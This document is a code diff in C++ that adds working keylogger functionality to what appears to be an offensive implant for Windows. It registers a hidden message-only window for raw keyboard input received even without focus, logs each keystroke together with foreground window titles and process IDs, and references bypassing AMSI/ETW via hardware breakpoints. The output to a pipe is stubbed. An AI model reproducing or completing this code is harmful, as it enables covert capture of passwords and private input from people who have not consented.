@@ -51,8 +51,8 @@ auto DECLFN KeyloggerInstall(
     // Register a Window class
     WNDCLASSEX WinClass = { 0 };
     WinClass.cbSize        = sizeof(WinClass);
-    WinClass.lpfnWndProc   = WndCallback;
-    WinClass.hInstance     = GetModuleHandle(NULL);
+    WinClass.lpfnWndProc   = WndCallback;            // process WM_INPUT messages
+    WinClass.hInstance     = Instance->Win32.GetModuleHandleA(NULL);
     WinClass.lpszClassName = KEYLOG_CLASS_NAME;
 
     if (!Instance->Win32.RegisterClassExW(&WinClass))
@@ -61,7 +61,7 @@ auto DECLFN KeyloggerInstall(
         return  KeyloggerCleanup();
     }
     
-    WindowHandle = Instance->Win32.CreateWindowExW(0, WinClass.lpszClassName, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, Instance->Win32.GetModuleHandle(NULL), NULL);
+    WindowHandle = Instance->Win32.CreateWindowExW(0, WinClass.lpszClassName, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, Instance->Win32.GetModuleHandleA(NULL), NULL);
     if(! WindowHandle)
     {
         return KeyloggerCleanup();
@@ -69,7 +69,7 @@ auto DECLFN KeyloggerInstall(
 
     RAWINPUTDEVICE RawDevice = { 0 };
 
-    RawDevice.usUsagePage = HID_USAGE_PAGE_GENERIC;      // Generic Desktop Controls
+    RawDevice.usUsagePage = HID_USAGE_PAGE_GENERIC;     // Generic Desktop Controls
     RawDevice.usUsage     = HID_USAGE_GENERIC_KEYBOARD; // Keyboard
     RawDevice.dwFlags     = RIDEV_INPUTSINK;            // Receive input even when not in focus
     RawDevice.hwndTarget  = WindowHandle;               // Our message-only window
@@ -79,6 +79,14 @@ auto DECLFN KeyloggerInstall(
         return KeyloggerCleanup();
     }
 
+    MSG Msg = { 0 };
+
+    // enter the window message processing loop 
+    while (Instance->Win32.GetMessageW(&Msg, NULL, 0, 0))
+    {
+        Instance->Win32.TranslateMessage(&Msg);
+        Instance->Win32.DispatchMessageW(&Msg);
+    }
 
     // deactive hwbp to bypass amsi/etw
     if ( Instance->Ctx.Bypass ) {
@@ -96,6 +104,146 @@ auto DECLFN KeyloggerInstall(
 
     return KeyloggerCleanup();
 }
+
+static LRESULT CALLBACK WndCallback(
+    _In_ HWND   Window,
+    _In_ UINT   Message,
+    _In_ WPARAM WParam,
+    _In_ LPARAM LParam
+) {
+    UINT      Length = 0;
+    PRAWINPUT RawInput = NULL;
+
+    switch (Message)
+    {
+        case WM_DESTROY:
+            Instance->Win32.PostQuitMessage(0);
+            return 0;
+
+        case WM_INPUT:
+            // Determine size of the input data
+            Instance->Win32.GetRawInputData((HRAWINPUT)LParam, RID_INPUT, NULL, &Length, sizeof(RAWINPUTHEADER));
+
+            // Allocate memory for the input structure
+            RawInput = (PRAWINPUT)Instance->Win32.HeapAlloc(Instance->Win32.GetProcessHeap(), HEAP_ZERO_MEMORY, Length);
+            if (!RawInput)
+            {
+                break;
+            }
+
+            // Retrieve input
+            if (Instance->Win32.GetRawInputData((HRAWINPUT)LParam, RID_INPUT, RawInput, &Length, sizeof(RAWINPUTHEADER)) != Length)
+            {
+                Instance->Win32.HeapFree(Instance->Win32.GetProcessHeap(), 0, RawInput);
+                break;
+            }
+
+            // Process input
+            if (RawInput->data.keyboard.Message == WM_KEYDOWN)
+            {
+                ProcessKey(RawInput->data.keyboard.VKey);
+            }
+
+            // Free allocated memory
+            Instance->Win32.HeapFree(Instance->Win32.GetProcessHeap(), 0, RawInput);
+            return 0;
+    }
+
+    // Return to Default Message Processing	
+    return Instance->Win32.DefWindowProcW(Window, Message, WParam, LParam);
+}
+
+WCHAR g_TitleBuffer[KEYLOG_BUFFER_LEN + 1] = { 0 };
+
+VOID ProcessWindowTitle()
+{
+    WCHAR Buffer[KEYLOG_BUFFER_LEN + 1] = { 0 };
+    WCHAR Title[KEYLOG_BUFFER_LEN + 1] = { 0 };
+    DWORD ProcessId = { 0 };
+    HWND  CurrentWindow = { 0 };
+    DWORD BytesWritten = { 0 };
+
+    Instance->Win32.RtlSecureZeroMemory(Buffer, sizeof(Buffer));
+    Instance->Win32.RtlSecureZeroMemory(Title, sizeof(Title));
+
+    // get current foreground/active window title
+    if ((CurrentWindow = Instance->GetForegroundWindow())) 
+    {
+        // get the window title name and the associated process id 
+        Instance->Win32.GetWindowThreadProcessId(CurrentWindow, &ProcessId);
+        if (!Instance->Win32.GetWindowTextW(CurrentWindow, Buffer, sizeof(Buffer))) {
+            swprintf(Buffer, KEYLOG_BUFFER_LEN, L"(No Title)");
+        }
+
+        // check when ever the title has been changed.
+        if (wcsncmp(g_TitleBuffer, Buffer, wcslen(Buffer)) != 0) {
+            memcpy(g_TitleBuffer, Buffer, sizeof(Buffer));
+
+            swprintf(Title, sizeof(Title), L"\n\n[%ld] %ls\n", ProcessId, g_TitleBuffer);
+
+            //if (!WriteFile(g_FileHandle, Title, wcslen(Title) * sizeof(wchar_t), &BytesWritten, NULL)) {
+            
+            // write to PIPE
+        }
+    }
+}
+
+VOID ProcessKey(UINT Key)
+{
+    WCHAR Unicode[2]                  = { 0 };
+    BYTE  Keyboard[256]               = { 0 };
+    WCHAR Buffer[KEYLOG_BUFFER_LEN+1] = { 0 };
+    DWORD BytesWritten                = { 0 };
+
+    Instance->Win32.RtlSecureZeroMemory(Keyboard, sizeof(Keyboard));
+    Instance->Win32.RtlSecureZeroMemory(Unicode, sizeof(Unicode));
+    Instance->Win32.RtlSecureZeroMemory(Buffer, sizeof(Buffer));
+
+    // log the current window title if it has been changed 
+    ProcessWindowTitle();
+
+    Instance->Win32.GetKeyState(0);
+    Instance->Win32.GetKeyboardState(Keyboard);
+
+    switch (Key)
+    {
+        case VK_CONTROL:
+            // dont log CTRL only 
+            break;
+
+        case VK_ESCAPE:
+            swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[ESCAPE]");
+            break;
+
+    case VK_RETURN:
+        swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[RETURN]");
+        break;
+
+    case VK_BACK:
+        swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[BACK]");
+        break;
+
+    case VK_TAB:
+        swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[TAB]");
+        break;
+
+    case VK_SPACE:
+        swprintf(Buffer, KEYLOG_BUFFER_LEN, L" ");
+        break;
+        
+    default:
+        if (Instance->Win32.ToUnicode(Key, Instance->Win32.MapVirtualKeyW(Key, MAPVK_VK_TO_VSC), Keyboard, Unicode, 1, 0) > 0) {
+            swprintf(Buffer, KEYLOG_BUFFER_LEN, L"%ls", Unicode);
+        }
+    }
+
+    // write the logged keystroke to the file 
+    //if (!WriteFile(g_FileHandle, Buffer, wcslen(Buffer) * sizeof(WCHAR), &BytesWritten, NULL)) {
+
+    // WRITE TO PIPE
+}
+
+
 
 auto DECLFN LibLoad( CHAR* LibName ) -> UPTR {
     G_INSTANCE
